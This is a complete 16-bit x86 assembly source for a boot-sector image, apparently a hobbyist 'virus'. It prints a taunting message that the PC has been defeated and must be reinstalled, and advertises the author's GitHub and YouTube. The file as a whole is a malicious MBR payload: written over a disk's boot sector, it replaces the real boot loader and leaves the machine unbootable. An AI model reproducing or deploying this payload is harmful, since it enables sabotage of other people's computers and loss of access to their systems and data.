[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 9      ; Green
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "T0xic Virus has defeated your PC!", 13, 10, "If you want, Reinstall Windows Again :)", 13, 10, "Github: github.com/GlebYoutuber", 13, 10, "YouTube: GlebYoutuber", 13, 10, "I hope, you liked this virus", 13, 10, "yeah, that's all", 13, 10, "Good Luck with restore Your PC :D"

times 510 - ($-$$) db 0
dw      0AA55h